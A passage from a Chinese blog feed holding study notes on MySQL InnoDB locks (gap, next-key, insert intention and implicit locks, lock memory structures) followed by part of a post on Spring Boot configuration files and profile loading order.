前介绍的锁在事务结束时释放是不一样的。</p><p><strong>采用一个轻量级的锁，在为插入语句生成AUTO_INCREMENT修饰的列的 值时获取一下这个轻量级锁，然后生成本次插入语句需要用到的 AUTO_INCREMENT列的值之后，就把该轻量级锁释放掉，并不需要等到 整个插入语句执行完才释放锁。 如果我们的插入语句在执行前就可以确定具体要插入多少条记录，比方说我们上边举的关于表t的例子中，在语句执行前就可以确定要插 入2条记录，那么一般采用轻量级锁的方式对AUTO_INCREMENT修饰的 列进行赋值。这种方式可以避免锁定表，可以提升插入性能。</strong></p><p>小 贴 士 ： 设 计 InnoDB 的 大 叔 提 供 了 一 个 称 之 为 innodb_autoinc_lock_mode的系统变量来控制到底使用上述两种方式中 的 哪 种 来 为 AUTO_INCREMENT 修 饰 的 列 进 行 赋 值 ， 当 innodb_autoinc_lock_mode 值 为 0 时 ， 一 律 采 用 AUTO-INC 锁 ； 当 innodb_autoinc_lock_mode 值 为 2 时 ， 一 律 采 用 轻 量 级 锁 ； 当 innodb_autoinc_lock_mode值为1时，两种方式混着来（也就是在插入 记录数量确定时采用轻量级锁，不确定时使用AUTO-INC锁）。【<strong>不过 当innodb_autoinc_lock_mode值为2时，可能会造成不同事务中的插入 语句为AUTO_INCREMENT修饰的列生成的值是交叉的，在有主从复制的场景中是不安全的。</strong>】这句话我不理解。。。</p><p><strong>行锁类型</strong></p><p><strong>Record Locks：</strong> 我们前边提到的记录锁就是这种类型，也就是仅仅把一条记录锁上，我决定给这种类型的锁起一个比较不正经的名字：正经记录锁（请允许我 皮 一 下 ， 我 实 在 不 知 道 该 叫 个 啥 名 好 ） 。 官 方 的 类 型 名 称 为 ： LOCK_REC_NOT_GAP。比方说我们把number值为8的那条记录加一个正经记 录锁的示意图如下：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205131709.png" alt="image-20211205131707854"></p><p><strong>Gap Locks</strong>： 我们说MySQL在REPEATABLE READ隔离级别下是可以解决幻读问题的，解 决方案有两种，可以使用MVCC方案解决，也可以采用加锁方案解决。但 是在使用加锁方案解决时有个大问题，就是事务在第一次执行读取操作 时，那些幻影记录尚不存在，我们无法给这些幻影记录加上正经记录 锁。不过这难不倒设计InnoDB的大叔，他们提出了一种称之为Gap Locks 的锁，官方的类型名称为：LOCK_GAP，我们也可以简称为gap锁。比方说 我们把number值为8的那条记录加一个gap锁的示意图如下：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205131938.png" alt="image-20211205131936888"></p><p><strong>如图中为number值为8的记录加了gap锁，意味着不允许别的事务在 number值为8的记录前边的间隙插入新记录，其实就是number列的值(3, 8)这个区间的新记录是不允许立即插入的。比方说有另外一个事务再想 插入一条number值为4的新记录，它定位到该条新记录的下一条记录的 number值为8，而这条记录上又有一个gap锁，所以就会阻塞插入操作， 直到拥有这个gap锁的事务提交了之后，number列的值在区间(3, 8)中的 新记录才可以被插入。 这个gap锁的提出仅仅是为了防止插入幻影记录而提出的，虽然有共享 gap锁和独占gap锁这样的说法，但是它们起到的作用都是相同的。而且 如果你对一条记录加了gap锁（不论是共享gap锁还是独占gap锁），并不 会限制其他事务对这条记录加正经记录锁或者继续加gap锁，再强调一 遍，gap锁的作用仅仅是为了防止插入幻影记录的而已。</strong></p><p>那对于最后一条记录之后的间 隙，也就是hero表中number值为20的记录之后的间隙该咋办呢？也就是 说给哪条记录加gap锁才能阻止其他事务插入number值在(20, +∞)这个区 间的新记录呢？这时候应该想起我们在前边唠叨数据页时介绍的两条伪 记录了： </p><p>Infimum记录，表示该页面中最小的记录。 Supremum记录，表示该页面中最大的记录。 </p><p>为了实现阻止其他事务插入number值在(20, +∞)这个区间的新记录，我 们可以给索引中的最后一条记录，也就是number值为20的那条记录所在 页面的Supremum记录加上一个gap锁，画个图就是这样：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205132141.png" alt="image-20211205132139710"></p><p>这样就可以阻止其他事务插入number值在(20, +∞)这个区间的新记录。 为了大家理解方便，之后的索引示意图中都会把这个Supremum记录画出来。</p><p><strong>Next-Key Locks</strong>： 有时候我们既想锁住某条记录，又想阻止其他事务在该记录前边的间隙 插入新记录，所以设计InnoDB的大叔们就提出了一种称之为Next-Key Locks的锁，官方的类型名称为：LOCK_ORDINARY，我们也可以简称为 next-key锁。比方说我们把number值为8的那条记录加一个next-key锁的 示意图如下</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205132307.png" alt="image-20211205132306241"></p><p>next-key锁的本质就是一个正经记录锁和一个gap锁的合体，它既能保护 该条记录，又能阻止别的事务将新记录插入被保护记录前边的间隙。</p><p><strong>Insert Intention Locks：</strong> 我们说一个事务在插入一条记录时需要判断一下插入位置是不是被别的 事务加了所谓的gap锁（next-key锁也包含gap锁，后边就不强调了），如 果有的话，插入操作需要等待，直到拥有gap锁的那个事务提交。但是设 计InnoDB的大叔规定事务在等待的时候也需要在内存中生成一个锁结 构，表明有事务想在某个间隙中插入新记录，但是现在在等待。设计 InnoDB的大叔就把这种类型的锁命名为Insert Intention Locks，<strong>官方 的类型名称为：LOCK_INSERT_INTENTION，我们也可以称为插入意向锁。 比方说我们把number值为8的那条记录加一个插入意向锁的示意图如下：</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205132452.png" alt="image-20211205132451101"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205132514.png" alt="image-20211205132512759"></p><p>T2和T3之间也并不会相 互阻塞，它们可以同时获取到number值为8的插入意向锁，然后执行插入 操作。事实上插入意向锁并不会阻止别的事务继续获取该记录上任何类 型的锁（插入意向锁就是这么鸡肋）。</p><p><strong>隐式锁</strong>：</p><p>我们前边说一个事务在执行INSERT操作时，如果即将插入的间隙已经被 其他事务加了gap锁，那么本次INSERT操作会阻塞，并且当前事务会在该 间隙上加一个插入意向锁，否则一般情况下INSERT操作是不加锁的。那 如果一个事务首先插入了一条记录（此时并没有与该记录关联的锁结 构），然后另一个事务：</p><p><strong>然后另一个事务： 立即使用SELECT … LOCK IN SHARE MODE语句读取这条事务，也就 是在要获取这条记录的S锁，或者使用SELECT … FOR UPDATE语句读 取这条事务或者直接修改这条记录，也就是要获取这条记录的X锁， 该咋办？</strong></p><p><strong>如果允许这种情况的发生，那么可能产生脏读问题。 立即修改这条记录，也就是要获取这条记录的X锁，该咋办？ 如果允许这种情况的发生，那么可能产生脏写问题。</strong></p><p>情景一：对于聚簇索引记录来说，有一个trx_id隐藏列，该隐藏列记 录着最后改动该记录的事务id。那么如果在当前事务中新插入一条聚 簇索引记录后，该记录的trx_id隐藏列代表的的就是当前事务的事务 id，如果其他事务此时想对该记录添加S锁或者X锁时，首先会看一下 该记录的trx_id隐藏列代表的事务是否是当前的活跃事务，如果是的 话，那么就帮助当前事务创建一个X锁（也就是为当前事务创建一个 锁结构，is_waiting属性是false），然后自己进入等待状态（也就 是为自己也创建一个锁结构，is_waiting属性是true）。 </p><p>情景二：对于二级索引记录来说，本身并没有trx_id隐藏列，但是在 二级索引页面的Page Header部分有一个PAGE_MAX_TRX_ID属性，该属 性代表对该页面做改动的最大的事务id，如果PAGE_MAX_TRX_ID属性值 小于当前最小的活跃事务id，那么说明对该页面做修改的事务都已经 提交了，否则就需要在页面中定位到对应的二级索引记录，然后回表 找到它对应的聚簇索引记录，然后再重复情景一的做法。 </p><p><strong>通过上边的叙述我们知道，一个事务对新插入的记录可以不显式的加锁 （生成一个锁结构），但是由于事务id这个牛逼的东东的存在，相当于 加了一个隐式锁。别的事务在对这条记录加S锁或者X锁时，由于隐式锁的存在，会先帮助当前事务生成一个锁结构，然后自己再生成一个锁结构 后进入等待状态。</strong></p><p>小贴士： 除了插入意向锁，在一些特殊情况下INSERT还会获取一些锁，我们稍后唠叨哈。</p><p><strong>InnoDB锁的内存结构</strong></p><p>决定在对不同记录加锁时，如果符合下边这些条件： </p><ul><li>在同一个事务中进行加锁操作 </li><li>被加锁的记录在同一个页面中 </li><li>加锁的类型是一样的 </li><li>等待状态是一样的</li></ul><p><strong>那么这些记录的锁就可以被放到一个锁结构中</strong>。当然，这么空口白牙的说有点儿抽象，我们还是画个图来看看InnoDB存储引擎中的锁结构具体长啥 样吧：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205133739.png" alt="image-20211205133737442"></p><ul><li><strong>锁所在的事务信息</strong>： 不论是表锁还是行锁，都是在事务执行过程中生成的，哪个事务生成了 这个锁结构，这里就记载着这个事务的信息。 </li></ul><p>小贴士： 实际上这个所谓的锁所在的事务信息在内存结构中只是一个 指针而已，所以不会占用多大内存空间，通过指针可以找到内存中关 于该事务的更多信息，比方说事务id是什么。下边介绍的所谓的索引信息其实也是一个指针。</p><ul><li><p><strong>索引信息</strong>： 对于行锁来说，需要记录一下加锁的记录是属于哪个索引的。 </p></li><li><p><strong>表锁／行锁信息</strong>： 表锁结构和行锁结构在这个位置的内容是不同的： </p></li></ul><p>表锁： 记载着这是对哪个表加的锁，还有其他的一些信息。 行锁： 记载了三个重要的信息： Space ID：记录所在表空间。 Page Number：记录所在页号。 n_bits：对于行锁来说，一条记录就对应着一个比特位，一个页面中包含很多记录，用不同的比特位来区分到底是哪一条记录加了 锁。为此在行锁结构的末尾放置了一堆比特位，这个n_bits属性代 表使用了多少比特位。</p><p>小贴士： 并不是该页面中有多少记录，n_bits属性的值就是多少。 为了让之后在页面中插入了新记录后也不至于重新分配锁结构，所 以n_bits的值一般都比页面中记录条数多一些。</p><ul><li><p><strong>type_mode</strong>： 这是一个32位的数，被分成了lock_mode、lock_type和rec_lock_type三 个部分，如图所示：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205134114.png" alt="image-20211205134113013"></p></li></ul><p><strong>锁的模式（lock_mode）</strong>，占用低4位，可选的值如下： </p><p>LOCK_IS（十进制的0）：表示共享意向锁，也就是IS锁。 </p><p>LOCK_IX（十进制的1）：表示独占意向锁，也就是IX锁。 </p><p>LOCK_S（十进制的2）：表示共享锁，也就是S锁。 </p><p>LOCK_X（十进制的3）：表示独占锁，也就是X锁。</p><p>LOCK_AUTO_INC（十进制的4）：表示AUTO-INC锁。</p><p>小 贴 士 ： 在 InnoDB 存 储 引 擎 中 ， LOCK_IS ， LOCK_IX ， LOCK_AUTO_INC都算是表级锁的模式，LOCK_S和LOCK_X既可 以算是表级锁的模式，也可以是行级锁的模式。</p><p><strong>锁的类型（lock_type）</strong>，占用第5～8位，不过现阶段只有第5位和第 6位被使用： </p><p>LOCK_TABLE（十进制的16），也就是当第5个比特位置为1时，表示表级锁。 </p><p>LOCK_REC（十进制的32），也就是当第6个比特位置为1时，表示行 级锁。</p><p><strong>行锁的具体类型（rec_lock_type）</strong>，使用其余的位来表示。只有在 lock_type的值为LOCK_REC时，也就是只有在该锁为行级锁时，才会 被细分为更多的类型：</p><p>LOCK_ORDINARY（十进制的0）：表示next-key锁。 LOCK_GAP（十进制的512）：也就是当第10个比特位置为1时，表示 gap锁。 LOCK_REC_NOT_GAP（十进制的1024）：也就是当第11个比特位置为 1时，表示正经记录锁。 LOCK_INSERT_INTENTION（十进制的2048）：也就是当第12个比特 位置为1时，表示插入意向锁。 其他的类型：还有一些不常用的类型我们就不多说了。</p><p>怎么还没看见is_waiting属性呢？这主要还是设计InnoDB的大叔太抠 门了，一个比特位也不想浪费，所以他们把is_waiting属性也放到了 <strong>type_mode</strong>这个32位的数字中：</p><p>LOCK_WAIT（十进制的256） ：也就是当第9个比特位置为1时，表 示is_waiting为true，也就是当前事务尚未获取到锁，处在等待状 态；当这个比特位为0时，表示is_waiting为false，也就是当前事 务获取锁成功。</p><ul><li><p>其他信息： 为了更好的管理系统运行过程中生成的各种锁结构而设计了各种哈希表 和链表，为了简化讨论，我们忽略这部分信息哈～ 一堆比特位</p></li><li><p>一堆比特位： 如果是行锁结构的话，在该结构末尾还放置了一堆比特位，比特位的数量是由上边提到的n_bits属性表示的。我们前边唠叨InnoDB记录结构的 时候说过，<strong>页面中的每条记录在记录头信息中都包含一个heap_no属性</strong>， 伪记录Infimum的heap_no值为0，Supremum的heap_no值为1，之后每插入 一条记录，heap_no值就增1。锁结构最后的一堆比特位就对应着一个页面中的记录，一个比特位映射一个heap_no，不过为了编码方便，映射 方式有点怪：</p></li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205135046.png" alt="image-20211205135045387"></p><p><strong>分析一下生成行锁结构的过程：</strong></p><p>事务T1要进行加锁，所以锁结构的锁所在事务信息指的就是T1。 </p><p>直接对聚簇索引进行加锁，所以索引信息指的其实就是PRIMARY索 引。 由于是行锁，所以接下来需要记录的是三个重要信息：</p><ul><li>Space ID：表空间号为67。</li><li>Page Number：页号为3。</li><li>n_bits：我们的hero表中现在只插入了5条用户记录，但是在初始 分配比特位时会多分配一些，这主要是为了在之后新增记录时不用 频繁分配比特位。其实计算n_bits有一个公式：</li></ul><p>n_bits = (1 + ((n_recs + LOCK_PAGE_BITMAP_MARGIN) / 8)) * 8</p><p>其中n_recs指的是当前页面中一共有多少条记录（算上伪记录和在 垃圾链表中的记录），比方说现在hero表一共有7条记录（5条用户 记 录 和 2 条 伪 记 录 ） ， 所 以 n_recs 的 值 就 是 7 ， LOCK_PAGE_BITMAP_MARGIN是一个固定的值64，所以本次加锁的 n_bits值就是：n_bits = (1 + ((7 + 64) / 8)) * 8 = 72</p><p>type_mode是由三部分组成的： </p><ul><li>lock_mode，这是对记录加S锁，它的值为LOCK_S。 </li><li>lock_type，这是对记录进行加锁，也就是行锁，所以它的值为 LOCK_REC。 </li><li>rec_lock_type，这是对记录加正经记录锁，也就是类型为 LOCK_REC_NOT_GAP的锁。另外，由于当前没有其他事务对该记 录加锁，所以应当获取到锁，也就是LOCK_WAIT代表的二进制位 应该是0。</li></ul><p>一堆比特位 因为number值为15的记录heap_no值为5，根据上边列举的比特位和 heap_no的映射图来看，应该是第一个字节从低位往高位数第6个比特 位被置为1，就像这样：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205142236.png" alt="image-20211205135724149"></p><p>综上所述，事务T1为number值为5的记录加锁生成的锁结构就如下图所示：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205135750.png" alt="image-20211205135749573"></p><p>T2想对number值为3、8、15的这三条记录加X型的next-key锁，在对记录 加行锁之前，需要先加表级别的IX锁，也就是会生成一个表级锁的内存 结构，不过我们这里不关心表级锁，所以就忽略掉了哈～ </p><p>现在T2要为3条记录加锁，number为3、8的两条记录由于没有其他事务加 锁，所以可以成功获取这条记录的X型next-key锁，也就是生成的锁结构 的is_waiting属性为false；但是number为15的记录已经被T1加了S型正 经记录锁，T2是不能获取到该记录的X型next-key锁的，也就是生成的锁 结构的is_waiting属性为true。因为等待状态不相同，所以这时候会生 成两个锁结构。这两个锁结构中相同的属性如下： </p><ul><li>事务T2要进行加锁，所以锁结构的锁所在事务信息指的就是T2。 </li><li>直接对聚簇索引进行加锁，所以索引信息指的其实就是PRIMARY索 引。 </li><li>由于是行锁，所以接下来需要记录是三个重要信息： Space ID：表空间号为67。 Page Number：页号为3。 n_bits：此属性生成策略同T1中一样，该属性的值为72。 type_mode是由三部分组成的： lock_mode，这是对记录加X锁，它的值为LOCK_X。 lock_type，这是对记录进行加锁，也就是行锁，所以它的值为 LOCK_REC。 rec_lock_type ， 这 是 对 记 录 加 next-key 锁 ， 也 就 是 类 型 为 LOCK_ORDINARY的锁。 </li><li>其他信息 略～ </li><li>不同的属性如下： 为number为3、8的记录生成的锁结构： type_mode值。 由 于 可 以 获 取 到 锁 ， 所 以 is_waiting 属 性 为 false ， 也 就 是 LOCK_WAIT代表的二进制位被置0。</li><li>一堆比特位 因为number值为3、8的记录heap_no值分别为3、4，根据上边列举 的比特位和heap_no的映射图来看，应该是第一个字节从低位往高 位数第4、5个比特位被置为1，就像这样：</li></ul><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205140320.png" alt="image-20211205140319531"></p><p>综上所述，事务T2为number值为3、8两条记录加锁生成的锁结构就如 下图所示：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205140340.png" alt="image-20211205140338991"></p><ul><li><p>为number为15的记录生成的锁结构： type_mode值。 由 于 可 以 获 取 到 锁 ， 所 以 is_waiting 属 性 为 true ， 也 就 是 LOCK_WAIT代表的二进制位被置1。</p></li><li><p>一堆比特位：因为number值为15的记录heap_no值为5，根据上边列举的比特位和 heap_no的映射图来看，应该是第一个字节从低位往高位数第6个比 特位被置为1，就像这样：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205142256.png" alt="image-20211205140421153"></p><p>综上所述，事务T2为number值为15的记录加锁生成的锁结构就如下图 所示</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211205140441.png" alt="image-20211205140439476"></p><p><strong>综上所述，事务T1先获取number值为15的S型正经记录锁，然后事务T2获取 number值为3、8、15的X型正经记录锁共需要生成3个锁结构。</strong>噗～ 关于锁结 构我本来就想写一点点的，没想到一写起来就停不下了，大家乐呵乐呵看 哈～</p><p>小贴士： 上边事务T2在对number值分别为3、8、15这三条记录加锁的 情景中，是按照先对number值为3的记录加锁、再对number值为8的记 录加锁，最后对number值为15的记录加锁的顺序进行的，如果我们一 开始就对number值为15的记录加锁，那么该事务在为number值为15的 记录生成一个锁结构后，直接就进入等待状态，就不为number值为3、 8的两条记录生成锁结构了。在事务T1提交后会把在number值为15的 记录上获取的锁释放掉，然后事务T2就可以获取该记录上的锁，这时 再对number值为3、8的两条记录加锁时，就可以复用之前为number值 为15的记录加锁时生成的锁结构了。</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;p&gt;nice~，学到蛮多的，搜罗了一堆网课还不如直接看书系统地过一遍知识点呢&lt;/p&gt;
&lt;h1 id=&quot;装作自己是个小白-——-重
      
    
    </summary>
    
    
      <category term="MySQL" scheme="https://blog.kaluna.top/categories/MySQL/"/>
    
    
      <category term="MySQL" scheme="https://blog.kaluna.top/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>Spring Boot的配置文件和自动配置原理</title>
    <link href="https://blog.kaluna.top/2021/10/29/Spring%20Boot%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%92%8C%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE%E5%8E%9F%E7%90%86/"/>
    <id>https://blog.kaluna.top/2021/10/29/Spring%20Boot%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%92%8C%E8%87%AA%E5%8A%A8%E9%85%8D%E7%BD%AE%E5%8E%9F%E7%90%86/</id>
    <published>2021-10-29T15:44:01.307Z</published>
    <updated>2021-11-30T01:53:01.245Z</updated>
    
    <content type="html"><![CDATA[<h1 id="使用Spring-Initializer快速创建Spring-Boot项目"><a href="#使用Spring-Initializer快速创建Spring-Boot项目" class="headerlink" title="使用Spring Initializer快速创建Spring Boot项目"></a>使用Spring Initializer快速创建Spring Boot项目</h1><p>IDEA：使用 Spring Initializer快速创建项目 </p><p>IDE都支持使用Spring的项目创建向导快速创建一个Spring Boot项目； 选择我们需要的模块；向导会联网创建Spring Boot项目； 默认生成的Spring Boot项目； </p><ul><li>主程序已经生成好了，我们只需要我们自己的逻辑 </li><li>resources文件夹中目录结构 <ul><li>static：保存所有的静态资源； js css images； </li><li>templates：保存所有的模板页面；（Spring Boot默认jar包使用嵌入式的Tomcat，默认不支持JSP页 面）；可以使用模板引擎（freemarker、thymeleaf）</li><li>application.properties：Spring Boot应用的配置文件；可以修改一些默认设置；</li></ul></li></ul><h1 id="自定义SpringApplication"><a href="#自定义SpringApplication" class="headerlink" title="自定义SpringApplication"></a>自定义SpringApplication</h1><p>如果SpringApplication默认设置不符合您的喜好，则可以创建一个本地实例并对其进行自定义。例如，要关闭横幅，您可 以编写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    SpringApplication app = <span class="keyword">new</span> SpringApplication(MySpringConfiguration<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    app.setBannerMode(Banner.Mode.OFF);</span><br><span class="line">    app.run(args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过构造者模式流式构造SpringApplication：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">new</span> SpringApplicationBuilder()</span><br><span class="line">        .bannerMode(Banner.Mode.OFF)</span><br><span class="line">        .run(args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="配置文件的使用"><a href="#配置文件的使用" class="headerlink" title="配置文件的使用"></a>配置文件的使用</h1><h2 id="配置文件介绍"><a href="#配置文件介绍" class="headerlink" title="配置文件介绍"></a>配置文件介绍</h2><p>SpringBoot使用一个全局的配置文件核心配置文件，配置文件名在约定的情况下名字是固定的； </p><p>配置文件的作用：修改SpringBoot自动配置的默认值；SpringBoot在底层都给我们自动配置好；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">application.properties</span><br><span class="line">application.yml </span><br><span class="line">application.yaml</span><br><span class="line"></span><br><span class="line">YAML（YAML Ain&#39;t Markup Language） </span><br><span class="line">YAML A Markup Language：是一个标记语言 </span><br><span class="line">YAML isn&#39;t Markup Language：不是一个标记语言；</span><br></pre></td></tr></table></figure><p>两种配置文件的格式</p><p>在springboot框架中，resource文件夹里可以存放配置的文件有两种：properties和yml。</p><ul><li>application.properties的用法：扁平的k/v格式</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">8081</span></span><br><span class="line"><span class="meta">server.servlet.context‐path</span>=<span class="string">/tuling</span></span><br></pre></td></tr></table></figure><ul><li>application.yml的用法：树型结构</li></ul><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line"><span class="attr">port:</span> <span class="number">8088</span></span><br><span class="line"><span class="attr">servlet:</span></span><br><span class="line"><span class="string">context‐path:</span> <span class="string">/tuling</span></span><br></pre></td></tr></table></figure><p>两种前者是properties，而后者是yml的，建议使用后者，因为它的可读性更强。 可以看到要转换成YML我们只需把properies里按. 去拆分即可。</p><h2 id="yml基本语法"><a href="#yml基本语法" class="headerlink" title="yml基本语法"></a>yml基本语法</h2><p>k:(空格)v：表示一对键值对（空格必须有）； </p><p>以空格的缩进来控制层级关系；只要是左对齐的一列数据，都是同一个层级的 </p><p>属性和值也是大小写敏感； 如果有特殊字符% &amp; 记得用单引号（‘）包起来</p><h2 id="配置文件的加载顺序"><a href="#配置文件的加载顺序" class="headerlink" title="配置文件的加载顺序"></a>配置文件的加载顺序</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">include</span>&gt;</span>**/application*.yml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">include</span>&gt;</span>**/application*.yaml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">include</span>&gt;</span>**/application*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果同时存在不同后缀的文件按照这个顺序加载主配置文件；互补配置；</p><h4 id="外部约定配置文件加载顺序"><a href="#外部约定配置文件加载顺序" class="headerlink" title="外部约定配置文件加载顺序"></a>外部约定配置文件加载顺序</h4><p>springboot 启动还会扫描以下位置的application.properties或者application.yml文件作为Spring boot的默认配置文件</p><ol><li><p>classpath根目录下的</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130095236.png" alt="image-20211030000148331"></p></li><li><p>classpath根config/</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130095238.png" alt="image-20211030000221224"></p></li><li><p>项目根目录</p><p>如果当前项目是继承/耦合 关系maven项目的话，项目根目录=父maven项目的根目录</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130095242.png" alt="image-20211030000259215"></p></li><li><p>项目根目录/config</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130095244.png" alt="image-20211030000426420"></p></li><li><p>直接子目录/config</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java ‐jar configuration_file‐<span class="number">0.0</span>.<span class="number">1</span>‐SNAPSHOT.jar ‐‐spring.config.location=D:\config/</span><br></pre></td></tr></table></figure></li></ol><p>优先级由低到高，高优先级的配置会覆盖低优先级的配置；互补配置；</p><p>官网：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">optional:classpath:&#x2F;</span><br><span class="line">optional:classpath:&#x2F;config&#x2F;</span><br><span class="line">optional:file:.&#x2F;</span><br><span class="line">optional:file:.&#x2F;config&#x2F;*&#x2F;</span><br><span class="line">optional:file:.&#x2F;config&#x2F;</span><br><span class="line">optional:classpath:custom‐config&#x2F; ‐‐spring.config.location</span><br><span class="line">optional:file:.&#x2F;custom‐config&#x2F; ‐‐spring.config.location</span><br></pre></td></tr></table></figure><h2 id="Profile文件的加载"><a href="#Profile文件的加载" class="headerlink" title="Profile文件的加载"></a>Profile文件的加载</h2><p>Profile的意思是配置，对于应用程序来说，不同的环境需要不同的配置。</p><p>SpringBoot框架提供了多profile的管理功能，我们可以使用profile功能来区分不同环境的配置。</p><h3 id="多Profile文件"><a href="#多Profile文件" class="headerlink" title="多Profile文件"></a>多Profile文件</h3><p>Spring官方给出的语法规则是application-{profile}.properties（.yaml/.yml）。</p><p>如果需要创建自定义的的properties文件时，可以用application-xxx.properties的命名方式， 根据实际情况，我创建了一个开发环境下使用的properties文件和一个生产环境下使用的properties文件，其中只对端口进行了配置，如下图所示</p><p>开发环境如下：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130095252.png" alt="image-20211030001210390"></p><p>生产环境如下：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130095255.png" alt="image-20211030001408893"></p><p>若我们需要在两种环境下进行切换，只需要在application.properties中加入如下内容即可</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211130095257.png" alt="image-20211030001353546"></p><p><strong>先按照位置来读取优先级， 在同一位置下profile优先级最高， 如果没有指定profile, 先yml‐‐yaml‐‐properties</strong></p><h3 id="激活指定profile"><a href="#激活指定profile" class="headerlink" title="激活指定profile"></a>激活指定profile</h3><ol><li><p>在配置文件中指定 spring.profiles.active=dev</p></li><li><p>命令行：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java ‐jar configuration_file‐<span class="number">0.0</span>.<span class="number">1</span>‐SNAPSHOT.jar ‐‐spring.profiles.active=dev；</span><br></pre></td></tr></table></figure><ol><li><p>还可以通过spring.config.location来改变默认的配置文件 使用spring.config.location 指定的配置文件，是不会进行互补</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java ‐jar configuration_file‐<span class="number">0.0</span>.<span class="number">1</span>‐SNAPSHOT.jar ‐‐spring.config.location=D:/application.properties</span><br></pre></td></tr></table></figure></li><li><p>还可以通过spring.config.name来改变默认的配置文件，是不会进行互补</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java ‐jar configuration_file‐<span class="number">0.0</span>.<span class="number">1</span>‐SNAPSHOT.jar ‐‐spring.config.name=application‐prod</span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="所有配置文件按以下顺序考虑：-优先级从低到高"><a href="#所有配置文件按以下顺序考虑：-优先级从低到高" class="headerlink" title="所有配置文件按以下顺序考虑： 优先级从低到高"></a>所有配置文件按以下顺序考虑： 优先级从低到高</h3><p>打包在jar中配置文件 </p><p>打包在jar中profile </p><p>打包的jar之外的配置文件 </p><p>打包的jar之外的profile</p><figure 